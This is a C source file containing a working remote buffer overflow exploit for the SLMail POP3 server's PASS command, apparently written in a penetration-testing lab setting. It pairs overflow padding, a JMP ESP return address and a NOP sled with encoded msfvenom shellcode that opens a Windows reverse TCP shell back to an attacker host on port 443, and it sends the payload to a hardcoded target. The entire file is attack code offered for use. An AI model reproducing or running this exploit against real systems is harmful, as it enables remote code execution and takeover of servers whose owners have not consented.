#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
#define retadd "\x8f\x35\x4a\x5f" /*JMP ESP in SLMFC.dll 0x5f4a358 */
#define port 110

/* msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.47 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai */
unsigned char shellcode[] =
"\xda\xcd\xd9\x74\x24\xf4\xba\x78\x1b\x12\x9e\x5e\x2b\xc9\xb1"
"\x52\x83\xee\xfc\x31\x56\x13\x03\x2e\x08\xf0\x6b\x32\xc6\x76"
"\x93\xca\x17\x17\x1d\x2f\x26\x17\x79\x24\x19\xa7\x09\x68\x96"
"\x4c\x5f\x98\x2d\x20\x48\xaf\x86\x8f\xae\x9e\x17\xa3\x93\x81"
"\x9b\xbe\xc7\x61\xa5\x70\x1a\x60\xe2\x6d\xd7\x30\xbb\xfa\x4a"
"\xa4\xc8\xb7\x56\x4f\x82\x56\xdf\xac\x53\x58\xce\x63\xef\x03"
"\xd0\x82\x3c\x38\x59\x9c\x21\x05\x13\x17\x91\xf1\xa2\xf1\xeb"
"\xfa\x09\x3c\xc4\x08\x53\x79\xe3\xf2\x26\x73\x17\x8e\x30\x40"
"\x65\x54\xb4\x52\xcd\x1f\x6e\xbe\xef\xcc\xe9\x35\xe3\xb9\x7e"
"\x11\xe0\x3c\x52\x2a\x1c\xb4\x55\xfc\x94\x8e\x71\xd8\xfd\x55"
"\x1b\x79\x58\x3b\x24\x99\x03\xe4\x80\xd2\xae\xf1\xb8\xb9\xa6"
"\x36\xf1\x41\x37\x51\x82\x32\x05\xfe\x38\xdc\x25\x77\xe7\x1b"
"\x49\xa2\x5f\xb3\xb4\x4d\xa0\x9a\x72\x19\xf0\xb4\x53\x22\x9b"
"\x44\x5b\xf7\x0c\x14\xf3\xa8\xec\xc4\xb3\x18\x85\x0e\x3c\x46"
"\xb5\x31\x96\xef\x5c\xc8\x71\x1a\xaa\xd2\xae\x72\xae\xd2\xb1"
"\x39\x27\x34\xdb\x2d\x6e\xef\x74\xd7\x2b\x7b\xe4\x18\xe6\x06"
"\x26\x92\x05\xf7\xe9\x53\x63\xeb\x9e\x93\x3e\x51\x08\xab\x94"
"\xfd\xd6\x3e\x73\xfd\x91\x22\x2c\xaa\xf6\x95\x25\x3e\xeb\x8c"
"\x9f\x5c\xf6\x49\xe7\xe4\x2d\xaa\xe6\xe5\xa0\x96\xcc\xf5\x7c"
"\x16\x49\xa1\xd0\x41\x07\x1f\x97\x3b\xe9\xc9\x41\x97\xa3\x9d"
"\x14\xdb\x73\xdb\x18\x36\x02\x03\xa8\xef\x53\x3c\x05\x78\x54"
"\x45\x7b\x18\x9b\x9c\x3f\x28\xd6\xbc\x16\xa1\xbf\x55\x2b\xac"
"\x3f\x80\x68\xc9\xc3\x20\x11\x2e\xdb\x41\x14\x6a\x5b\xba\x64"
"\xe3\x0e\xbc\xdb\x04\x1b";
 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(13);
    memset(nop, 0x00, 13);
    memset(nop, 0x90, 12);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.24.18");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}